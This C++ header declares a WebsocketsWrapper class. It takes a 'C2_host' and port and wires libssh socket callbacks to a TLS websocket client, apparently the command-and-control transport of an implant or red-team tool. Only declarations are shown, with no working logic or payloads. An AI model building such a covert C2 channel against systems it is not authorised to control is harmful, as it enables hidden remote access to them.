#pragma once

#define ASIO_STANDALONE
#define _WEBSOCKETPP_CPP11_INTERNAL_
#include <websocketpp/config/asio_client.hpp>
#include <websocketpp/client.hpp>

#include <libssh/libssh.h>

class WebsocketsWrapper 
{ 
    typedef websocketpp::lib::shared_ptr<websocketpp::lib::asio::ssl::context> context_ptr;
    typedef websocketpp::config::asio_client::message_type::ptr message_ptr;

public:
    WebsocketsWrapper(const char* C2_host, unsigned short C2_port);
    void run2();
    typedef websocketpp::client<websocketpp::config::asio_tls_client> client;

    // io callbacks
    static int recv_cb(socket_t socket, void* userdata, char* buffer, int size);
    static int send_cb(socket_t socket, void* userdata, const char* buffer, int size);
    static void close_cb(socket_t socket, void* userdata);
    void run();

private:

    client ws_client;
    std::string uri;
    static client::connection_ptr con;
    static bool connected;
    static std::vector<unsigned char> buffer;
    static std::mutex mtx;
    std::shared_ptr<std::thread> io_thread;
    
    static context_ptr on_tls_init(websocketpp::connection_hdl);
    static void on_message(client* c, websocketpp::connection_hdl hdl, message_ptr msg);


};

